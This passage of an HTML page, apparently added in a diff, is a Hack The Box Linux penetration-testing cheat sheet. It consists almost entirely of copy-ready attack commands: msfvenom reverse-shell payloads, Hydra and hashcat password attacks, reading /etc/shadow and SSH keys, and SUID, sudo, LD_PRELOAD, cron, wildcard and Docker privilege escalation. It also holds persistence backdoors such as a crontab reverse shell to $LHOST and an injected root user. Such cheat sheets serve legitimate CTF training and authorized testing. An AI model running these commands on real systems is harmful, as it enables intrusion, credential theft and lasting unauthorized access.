+msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
+
+<span class="cm"># Python</span>
+msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.py
+
+<span class="cm"># Bash</span>
+msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw -o shell.sh
+
+<span class="cm"># Web</span>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp</div></div>
+<h3 class="md-h3" id="44-password-attacks">4.4 Password Attacks</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Hydra — SSH</span>
+hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
+
+<span class="cm"># Hydra — FTP</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$IP
+
+<span class="cm"># Hydra — HTTP form</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid"
+hydra -l admin -P rockyou.txt $IP http-get-form "/login:user=^USER^&amp;pass=^PASS^:F=incorrect"
+
+<span class="cm"># Hydra — HTTP basic auth</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /admin/
+
+<span class="cm"># Medusa — SSH</span>
+medusa -h $IP -u user -P /usr/share/wordlists/rockyou.txt -M ssh
+
+<span class="cm"># CrackMapExec — SMB password spray</span>
+crackmapexec smb $IP -u users.txt -p passwords.txt --continue-on-success
+
+<span class="cm"># Hash cracking with hashcat</span>
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt        <span class="cm"># MD5</span>
+hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt      <span class="cm"># SHA1</span>
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt     <span class="cm"># sha512crypt</span>
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt     <span class="cm"># NTLM</span>
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt     <span class="cm"># NTLMv2</span>
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+<span class="cm"># John the Ripper</span>
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john hash.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
+john --show hash.txt
+
+<span class="cm"># Convert for john</span>
+zip2john file.zip &gt; zip.hash
+pdf2john file.pdf &gt; pdf.hash
+ssh2john id_rsa &gt; ssh.hash</div></div>
+<h3 class="md-h3" id="45-searchsploit-public-exploits">4.5 Searchsploit & Public Exploits</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Search</span>
+searchsploit apache 2.4
+searchsploit openssh 7.4
+searchsploit -w "term"  <span class="cm"># open in browser</span>
+
+<span class="cm"># Copy exploit to local dir</span>
+searchsploit -m exploits/linux/remote/12345.py
+
+<span class="cm"># Check Exploit-DB manually</span>
+<span class="cm"># https://www.exploit-db.com</span>
+
+<span class="cm"># GitHub PoC search</span>
+<span class="cm"># https://github.com/search?q=CVE-2024-XXXX</span>
+
+<span class="cm"># Install tools</span>
+pip3 install git+https://github.com/...</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="phase-5-post-exploitation-stabilization" style="margin-top:36px"><span class="sec-title">Phase 5 — Post-Exploitation & Stabilization</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="51-shell-stabilization-critical">5.1 Shell Stabilization (Critical!)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Method 1 — Python PTY</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="cm"># Then: Ctrl+Z</span>
+stty raw -echo; fg
+<span class="cm"># Press Enter twice</span>
+export TERM=xterm
+
+<span class="cm"># Method 2 — Socat (fully interactive)</span>
+<span class="cm"># On attacker:</span>
+socat file:`tty`,raw,echo=0 tcp-listen:$LPORT
+<span class="cm"># On target:</span>
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT
+
+<span class="cm"># Method 3 — Script</span>
+script /dev/null -c bash
+<span class="cm"># Then Ctrl+Z, stty raw -echo; fg</span>
+
+<span class="cm"># Fix terminal size</span>
+stty -a  <span class="cm"># check your local terminal size</span>
+stty rows 40 cols 200  <span class="cm"># set on victim</span>
+
+<span class="cm"># Set env</span>
+export SHELL=bash
+export TERM=xterm-256color</div></div>
+<h3 class="md-h3" id="52-file-transfer">5.2 File Transfer</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Python HTTP server (quickest)</span>
+python3 -m http.server 8080
+<span class="cm"># On victim:</span>
+wget http://$LHOST:8080/file -O /tmp/file
+curl http://$LHOST:8080/file -o /tmp/file
+
+<span class="cm"># Netcat transfer</span>
+nc -lvnp 9001 &gt; file.out  <span class="cm"># receiver</span>
+nc -nv $LHOST 9001 &lt; file.in  <span class="cm"># sender</span>
+
+<span class="cm"># Base64 encode/decode</span>
+base64 -w 0 file  <span class="cm"># encode (on source)</span>
+echo "BASE64DATA" | base64 -d &gt; file  <span class="cm"># decode (on dest)</span>
+
+<span class="cm"># SCP (if SSH available)</span>
+scp file.txt user@$IP:/tmp/
+scp user@$IP:/etc/passwd .
+
+<span class="cm"># SMB server (Impacket)</span>
+impacket-smbserver share . -smb2support
+<span class="cm"># On victim: copy \\$LHOST\share\file .</span>
+
+<span class="cm"># Upload with curl</span>
+curl -X POST http://site/upload -F "file=@shell.php"
+
+<span class="cm"># Upload with wget</span>
+wget --post-file=shell.php http://site/upload</div></div>
+<h3 class="md-h3" id="53-situational-awareness">5.3 Situational Awareness</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Who am I</span>
+id
+whoami
+hostname
+uname -a
+
+<span class="cm"># Network</span>
+ip a
+ip route
+netstat -antp
+ss -antp
+cat /etc/hosts
+
+<span class="cm"># OS / Kernel</span>
+cat /etc/os-release
+cat /etc/issue
+uname -r  <span class="cm"># kernel version — search for kernel exploits!</span>
+
+<span class="cm"># Users</span>
+cat /etc/passwd
+cat /etc/shadow  <span class="cm"># need root</span>
+cat /etc/group
+w
+who
+last
+
+<span class="cm"># Running processes</span>
+ps aux
+ps -ef
+top
+
+<span class="cm"># Cron jobs</span>
+crontab -l
+cat /etc/crontab
+ls -la /etc/cron.*
+cat /etc/cron.d/*
+
+<span class="cm"># Interesting files</span>
+find / -name "*.txt" -readable 2&gt;/dev/null
+find / -name "*.conf" -readable 2&gt;/dev/null
+find / -name "config.php" -readable 2&gt;/dev/null
+find / -name "*.bak" -readable 2&gt;/dev/null
+find / -name ".env" -readable 2&gt;/dev/null
+
+<span class="cm"># History files</span>
+cat ~/.bash_history
+cat ~/.zsh_history
+cat ~/.mysql_history
+
+<span class="cm"># SSH keys</span>
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+find / -name "id_rsa" 2&gt;/dev/null
+find / -name "authorized_keys" 2&gt;/dev/null</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="phase-6-linux-privilege-escalation" style="margin-top:36px"><span class="sec-title">Phase 6 — Linux Privilege Escalation</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="61-automated-enumeration">6.1 Automated Enumeration</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># LinPEAS (best all-in-one)</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+<span class="cm"># Or transfer and run:</span>
+wget http://$LHOST:8080/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.out
+
+<span class="cm"># LinEnum</span>
+wget http://$LHOST:8080/LinEnum.sh -O /tmp/LinEnum.sh
+chmod +x /tmp/LinEnum.sh
+/tmp/LinEnum.sh -t | tee /tmp/linenum.out
+
+<span class="cm"># pspy (process spy — no root needed)</span>
+wget http://$LHOST:8080/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64
+/tmp/pspy64 | tee /tmp/pspy.out  <span class="cm"># watch for 5+ mins!</span>
+
+<span class="cm"># linux-exploit-suggester</span>
+wget http://$LHOST:8080/linux-exploit-suggester.sh -O /tmp/les.sh
+chmod +x /tmp/les.sh
+/tmp/les.sh | tee /tmp/les.out</div></div>
+<h3 class="md-h3" id="62-suid-sgid-binaries">6.2 SUID / SGID Binaries</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Find all SUID binaries</span>
+find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+
+<span class="cm"># Find SGID binaries</span>
+find / -perm -2000 -type f 2&gt;/dev/null
+
+<span class="cm"># Check GTFObins for each!</span>
+<span class="cm"># https://gtfobins.github.io</span>
+
+<span class="cm"># Common SUID exploits:</span>
+<span class="cm"># bash SUID</span>
+bash -p
+
+<span class="cm"># find SUID</span>
+find . -exec /bin/bash -p \; -quit
+
+<span class="cm"># vim SUID</span>
+vim -c ':!/bin/bash'
+
+<span class="cm"># nano SUID — read /etc/passwd, add root user</span>
+<span class="cm"># cp SUID — copy bash to /tmp, add SUID bit</span>
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+/tmp/rootbash -p
+
+<span class="cm"># nmap SUID (old)</span>
+nmap --interactive
+!sh
+
+<span class="cm"># env SUID</span>
+env /bin/bash -p
+
+<span class="cm"># python SUID</span>
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'</div></div>
+<h3 class="md-h3" id="63-sudo-abuse">6.3 Sudo Abuse</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Check sudo permissions</span>
+sudo -l
+
+<span class="cm"># Check if NOPASSWD for any command</span>
+
+<span class="cm"># Sudo ALL</span>
+sudo /bin/bash
+
+<span class="cm"># Specific command exploits (from GTFObins):</span>
+sudo vim -c ':!/bin/bash'
+sudo nano  <span class="cm"># then Ctrl+R, Ctrl+X, reset; sh 1&gt;&amp;0 2&gt;&amp;0</span>
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo python3 -c 'import os; os.system("/bin/bash")'
+sudo find / -exec /bin/bash \; -quit
+sudo less /etc/passwd  <span class="cm"># then !bash</span>
+sudo man bash  <span class="cm"># then !bash</span>
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"
+sudo env /bin/bash
+sudo ed  <span class="cm"># then !bash</span>
+sudo ftp  <span class="cm"># then !bash</span>
+sudo lua -e 'os.execute("/bin/bash")'
+sudo ruby -e 'exec "/bin/bash"'
+sudo perl -e 'exec "/bin/bash";'
+
+<span class="cm"># Sudo with wildcard abuse</span>
+<span class="cm"># e.g. sudo /usr/bin/rsync * </span>
+<span class="cm"># Use: --rsync-path="sudo /bin/bash"</span>
+
+<span class="cm"># LD_PRELOAD abuse (if env_keep += LD_PRELOAD)</span>
+cat &gt; /tmp/shell.c &lt;&lt; EOF
+<span class="cm">#include &lt;stdio.h&gt;</span>
+<span class="cm">#include &lt;sys/types.h&gt;</span>
+<span class="cm">#include &lt;stdlib.h&gt;</span>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0); setuid(0);
+    system("/bin/bash");
+}
+EOF
+gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so &lt;allowed_command&gt;</div></div>
+<h3 class="md-h3" id="64-writable-files-cron-jobs">6.4 Writable Files & Cron Jobs</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># World-writable files</span>
+find / -writable -type f 2&gt;/dev/null | grep -v proc | grep -v sys
+find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2&gt;/dev/null
+
+<span class="cm"># World-writable directories</span>
+find / -writable -type d 2&gt;/dev/null
+
+<span class="cm"># Watch cron jobs via pspy</span>
+/tmp/pspy64
+
+<span class="cm"># Exploit writable cron script</span>
+echo "bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'" &gt;&gt; /etc/cron.d/script.sh
+
+<span class="cm"># Writable /etc/passwd</span>
+openssl passwd -1 -salt hacker password123
+echo "hacker:\$1\$hacker\$HASH:0:0:root:/root:/bin/bash" &gt;&gt; /etc/passwd
+su hacker  <span class="cm"># password: password123</span>
+
+<span class="cm"># Path hijacking via cron</span>
+<span class="cm"># If cron runs: /usr/local/bin/backup.sh which calls 'curl' without full path:</span>
+echo '<span class="cm">#!/bin/bash' &gt; /tmp/curl</span>
+echo 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1' &gt;&gt; /tmp/curl
+chmod +x /tmp/curl
+export PATH=/tmp:$PATH</div></div>
+<h3 class="md-h3" id="65-capabilities">6.5 Capabilities</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Find capabilities</span>
+getcap -r / 2&gt;/dev/null
+find / -xdev 2&gt;/dev/null | xargs getcap 2&gt;/dev/null
+
+<span class="cm"># Common exploitable capabilities:</span>
+<span class="cm"># cap_setuid+ep</span>
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+<span class="cm"># cap_net_raw (tcpdump)</span>
+<span class="cm"># cap_dac_override (ignore read/write permissions)</span>
+
+<span class="cm"># perl cap_setuid</span>
+perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+<span class="cm"># ruby cap_setuid</span>
+ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'</div></div>
+<h3 class="md-h3" id="66-kernel-exploits">6.6 Kernel Exploits</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Check kernel version</span>
+uname -r
+uname -a
+cat /proc/version
+
+<span class="cm"># Google: "Ubuntu 18.04 4.15.0 kernel exploit"</span>
+<span class="cm"># DirtyPipe (CVE-2022-0847, kernel &lt; 5.16.11)</span>
+<span class="cm"># DirtyCow (CVE-2016-5195, kernel &lt; 4.8.3)</span>
+<span class="cm"># Baron Samedit (sudo &lt; 1.9.5p2 CVE-2021-3156)</span>
+
+<span class="cm"># linux-exploit-suggester</span>
+/tmp/les.sh 2&gt;/dev/null | grep -E "high|medium"
+
+<span class="cm"># Compile on target if gcc available</span>
+gcc exploit.c -o exploit
+./exploit
+
+<span class="cm"># Or compile locally (match arch)</span>
+gcc -m64 exploit.c -o exploit  <span class="cm"># 64-bit</span>
+gcc -m32 exploit.c -o exploit  <span class="cm"># 32-bit</span></div></div>
+<h3 class="md-h3" id="67-docker-escape">6.7 Docker Escape</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Check if inside docker</span>
+cat /.dockerenv  <span class="cm"># exists? you're in docker</span>
+hostname
+cat /proc/1/cgroup | grep docker
+
+<span class="cm"># Docker socket escape</span>
+ls -la /var/run/docker.sock
+<span class="cm"># If writable:</span>
+docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu /bin/bash
+<span class="cm"># Then: chroot /host /bin/bash</span>
+
+<span class="cm"># Docker group escape</span>
+id  <span class="cm"># check if in "docker" group</span>
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+<span class="cm"># Cap SYS_ADMIN</span>
+<span class="cm"># capsh --print | grep cap_sys_admin</span>
+mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp</div></div>
+<h3 class="md-h3" id="68-path-hijacking">6.8 PATH Hijacking</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Find SUID binaries using PATH</span>
+strings /usr/local/bin/suid_binary | grep -v "/" | head -20
+<span class="cm"># Look for commands without absolute paths</span>
+
+<span class="cm"># Create malicious binary</span>
+echo '<span class="cm">#!/bin/bash' &gt; /tmp/service</span>
+echo '/bin/bash -p' &gt;&gt; /tmp/service
+chmod +x /tmp/service
+
+<span class="cm"># Prepend /tmp to PATH</span>
+export PATH=/tmp:$PATH
+
+<span class="cm"># Run vulnerable SUID binary</span>
+/usr/local/bin/suid_binary</div></div>
+<h3 class="md-h3" id="69-nfs-root-squashing">6.9 NFS Root Squashing</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Check on victim</span>
+cat /etc/exports
+<span class="cm"># Look for "no_root_squash"</span>
+
+<span class="cm"># On attacker (as root):</span>
+showmount -e $IP
+mount -t nfs $IP:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/rootbash
+chmod +s /mnt/nfs/rootbash
+
+<span class="cm"># On victim:</span>
+/share/rootbash -p</div></div>
+<h3 class="md-h3" id="610-wildcard-injection">6.10 Wildcard Injection</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># If cron runs: tar -czf backup.tar.gz /var/www/html/*</span>
+<span class="cm"># In /var/www/html/, create:</span>
+echo "" &gt; "--checkpoint=1"
+echo "" &gt; "--checkpoint-action=exec=bash shell.sh"
+cat &gt; shell.sh &lt;&lt; EOF
+<span class="cm">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1
+EOF
+chmod +x shell.sh</div></div>
+<h3 class="md-h3" id="611-library-hijacking">6.11 Library Hijacking</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Find programs using shared libs</span>
+ldd /usr/local/bin/program
+<span class="cm"># Look for missing libs or writable lib paths</span>
+
+<span class="cm"># Check LD_LIBRARY_PATH</span>
+echo $LD_LIBRARY_PATH
+
+<span class="cm"># Create malicious shared library</span>
+cat &gt; /tmp/malicious.c &lt;&lt; EOF
+<span class="cm">#include &lt;stdio.h&gt;</span>
+<span class="cm">#include &lt;stdlib.h&gt;</span>
+static void inject() __attribute__((constructor));
+void inject() {
+    system("bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'");
+}
+EOF
+gcc -shared -fPIC -o /tmp/libmalicious.so /tmp/malicious.c
+LD_LIBRARY_PATH=/tmp program</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="phase-7-persistence-loot" style="margin-top:36px"><span class="sec-title">Phase 7 — Persistence & Loot</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="71-user-flag">7.1 User Flag</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Find it</span>
+find / -name "user.txt" 2&gt;/dev/null
+cat /home/*/user.txt</div></div>
+<h3 class="md-h3" id="72-root-flag">7.2 Root Flag</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body">cat /root/root.txt</div></div>
+<h3 class="md-h3" id="73-credential-dumping">7.3 Credential Dumping</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># /etc/shadow</span>
+cat /etc/shadow
+
+<span class="cm"># Crack with hashcat</span>
+hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt  <span class="cm"># sha512crypt</span>
+hashcat -m 500 shadow.txt /usr/share/wordlists/rockyou.txt   <span class="cm"># md5crypt</span>
+
+<span class="cm"># SSH keys</span>
+cat /root/.ssh/id_rsa
+cat /home/*/.ssh/id_rsa
+
+<span class="cm"># Application configs</span>
+find / -name "*.conf" -readable 2&gt;/dev/null | xargs grep -l "password\|passwd\|secret" 2&gt;/dev/null
+find / -name "*.php" -readable 2&gt;/dev/null | xargs grep -l "password\|passwd" 2&gt;/dev/null
+grep -r "DB_PASS\|DB_PASSWORD\|password\|secret" /var/www/html/ 2&gt;/dev/null
+
+<span class="cm"># History files</span>
+cat ~/.bash_history
+cat ~/.zsh_history
+cat /home/*/.bash_history
+
+<span class="cm"># Mail</span>
+cat /var/mail/*
+cat /var/spool/mail/*</div></div>
+<h3 class="md-h3" id="74-persistence">7.4 Persistence</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Add SSH key</span>
+mkdir -p ~/.ssh
+echo "ssh-rsa YOUR_PUBKEY" &gt;&gt; ~/.ssh/authorized_keys
+chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys
+
+<span class="cm"># Add root user</span>
+openssl passwd -1 -salt hacker password
+echo "hacker:\$1\$hacker\$HASH:0:0:hacker:/root:/bin/bash" &gt;&gt; /etc/passwd
+
+<span class="cm"># Crontab backdoor</span>
+(crontab -l; echo "* * * * * bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1") | crontab -</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="wordlists-resources" style="margin-top:36px"><span class="sec-title">Wordlists & Resources</span><span class="sec-line"></span></div>
+<h3 class="md-h3" id="wordlists-seclists">Wordlists (SecLists)</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Directories</span>
+/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+/usr/share/wordlists/dirb/common.txt
+
+<span class="cm"># Passwords</span>
+/usr/share/wordlists/rockyou.txt
+/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+<span class="cm"># Usernames</span>
+/usr/share/seclists/Usernames/top-usernames-shortlist.txt
+/usr/share/seclists/Usernames/Names/names.txt
+
+<span class="cm"># DNS / VHosts</span>
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+<span class="cm"># LFI</span>
+/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+<span class="cm"># Parameters</span>
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+<span class="cm"># SQL Injection</span>
+/usr/share/seclists/Fuzzing/SQLi/</div></div>
+<h3 class="md-h3" id="key-references">Key References</h3>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body">GTFOBins:         https://gtfobins.github.io
+Exploit-DB:       https://www.exploit-db.com
+RevShells:        https://www.revshells.com
+PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+HackTricks:       https://book.hacktricks.xyz
+PEASS-ng:         https://github.com/carlospolop/PEASS-ng
+SecLists:         https://github.com/danielmiessler/SecLists
+pspy:             https://github.com/DominicBreuker/pspy</div></div>
+<hr class="md-hr">
+<div class="sec-hdr" id="one-liners-tricks" style="margin-top:36px"><span class="sec-title">One-Liners & Tricks</span><span class="sec-line"></span></div>
+<div class="terminal"><div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn" onclick="copyTerm(this)">copy</button></div><div class="term-body"><span class="cm"># Find passwords in files</span>
+grep -rn "password\|passwd\|secret\|api_key" /var/www/ 2&gt;/dev/null
+
+<span class="cm"># Find writable directories</span>
+find / -writable -type d 2&gt;/dev/null | grep -v '/proc\|/sys\|/dev'
+
+<span class="cm"># Find files modified recently (last 10 min)</span>
+find / -mmin -10 -type f 2&gt;/dev/null | grep -v '/proc\|/sys'
+
+<span class="cm"># Find config files</span>
+find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2&gt;/dev/null | grep -v '/proc\|/sys'
+
+<span class="cm"># Port scan from victim (when no nmap)</span>
+for p in $(seq 1 1000); do (echo &gt;/dev/tcp/127.0.0.1/$p) 2&gt;/dev/null &amp;&amp; echo "$p open"; done
+
+<span class="cm"># Check listening ports (no netstat)</span>
+ss -antp
+cat /proc/net/tcp  <span class="cm"># hex ports</span>
+
+<span class="cm"># Quick hash ID</span>
+hash-identifier &lt;hash&gt;
+hashid &lt;hash&gt;
+
+<span class="cm"># Decode base64</span>
+echo "BASE64==" | base64 -d
+cat file | base64 -d
+
+<span class="cm"># URL decode</span>
+python3 -c "from urllib.parse import unquote; print(unquote('URL_STRING'))"
+
+<span class="cm"># ROT13</span>
+echo "STRING" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+<span class="cm"># Hex decode</span>
+echo "48656c6c6f" | xxd -r -p
+
+<span class="cm"># Get file type</span>
+file suspicious_file
+
+<span class="cm"># Check SUID bash</span>
+ls -la /bin/bash  <span class="cm"># should be -rwxr-xr-x</span>
+bash -p  <span class="cm"># if SUID set</span>
+
+<span class="cm"># Chisel tunneling</span>
+<span class="cm"># Attacker:</span>
+./chisel server -p 8001 --reverse
+<span class="cm"># Victim:</span>
+./chisel client $LHOST:8001 R:127.0.0.1:8080:127.0.0.1:8080
+
+<span class="cm"># Ligolo-ng tunneling</span>
+<span class="cm"># Attacker:</span>
+./proxy -selfcert -laddr 0.0.0.0:11601
+<span class="cm"># Victim:</span>
+./agent -connect $LHOST:11601 -ignore-cert</div></div>
+<hr class="md-hr">
+<p class="md-p"><em>🔒 Built for HTB by 0xRoot | Hack The Box Linux Methodology</em> <em>Use responsibly on authorized systems only.</em></p>
+
+</div>
+<script>
+  initPage({
+    title: 'Linux Penetration Testing Cheatsheet',
+    breadcrumb: 'cheatsheets/htb_LINUX_cheatsheet',
+    tags: [{ label: 'Linux', color: 'green' }, { label: 'PrivEsc', color: 'teal' }],
+    extraSb: `
+      <div style="padding:13px 10px 6px;border-top:1px solid var(--border)">
+        <div class="sb-sec-lbl">contents</div>
+        <a href="#by-j0stif-full-methodology-recon-root" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>by J0stif | Full Methodology: Recon → Root</a>
+<a href="#table-of-contents" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>📋 TABLE OF CONTENTS</a>
+<a href="#environment-setup" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>🛠️ Environment Setup</a>
+<a href="#phase-1-reconnaissance-enumeration" class="sb-item" style="font-size:10px;"><span class="sb-icon" style="color:var(--muted)">▸</span>Phase 1 — Reconnaissance & Enumeration</a>
+<a href="#11-nmap-initial-scans" class="sb-item" style="font-size:10px;padding-left:16px;"><span class="sb-icon" style="color:var(--muted)">▸</span>1.1 Nmap — Initial Scans</a>
